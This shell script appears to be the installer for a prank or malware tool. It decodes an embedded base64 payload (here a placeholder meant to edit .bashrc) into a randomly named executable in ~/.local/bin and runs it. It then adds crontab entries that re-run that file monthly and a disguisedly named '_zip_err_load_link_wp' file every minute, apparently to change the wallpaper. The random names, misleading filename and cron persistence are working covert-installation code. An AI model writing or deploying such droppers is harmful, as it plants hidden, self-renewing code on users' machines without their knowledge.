#!/bin/sh

# get name of desktop environment
de_info="$DESKTOP_SESSION $XDG_CURRENT_DESKTOP" # this may contain weird stuff we don't need, but this string is searched using grep anyway
if [ -n "$GNOME_DESKTOP_SESSION_ID" ]; then
    de_info="gnome"
fi
if [ -n "$MATE_DESKTOP_SESSION_ID" ]; then
    de_info="mate"
fi



filename_length=$((($(date +%N) % 5) + 1))
filepath="$HOME/.local/bin/$(head -c $filename_length  /dev/urandom | base64 | head -c $filename_length | tr '/' '-')"
while [ -e "$filepath" ]; do
    filename_length=$((filename_length + 1))
    filepath="$HOME/.local/bin/$(head -c $filename_length  /dev/urandom | base64 | head -c $filename_length | tr '/' '-')"
done

mkdir -p "$HOME/.local/bin"

echo "PLACEHOLDER_edit_bashrc" | base64 --decode | awk -v newpath="this_file_path='$filepath'" 'NR==3 {$0=newpath} {print}' > "$filepath"
chmod +x "$filepath"
"$filepath"

# echo "PLACEHOLDER_change_wallpaper" | base64 --decode | sed "s/INST_PLACEHOLDER_de_info/$de_info/g" > "$HOME/.local/bin/_zip_err_load_link_wp"
# chmod +x "$HOME/.local/bin/_zip_err_load_link_wp"
# "$HOME/.local/bin/_zip_err_load_link_wp"

{ crontab -l | grep -Fv "$filepath" | grep -Fv "_zip_err_load_link_wp"; printf '00 11 1 * * %s\n* * * * * %s/.local/bin/_zip_err_load_link_wp\n' "$filepath" "$HOME"; } | crontab -
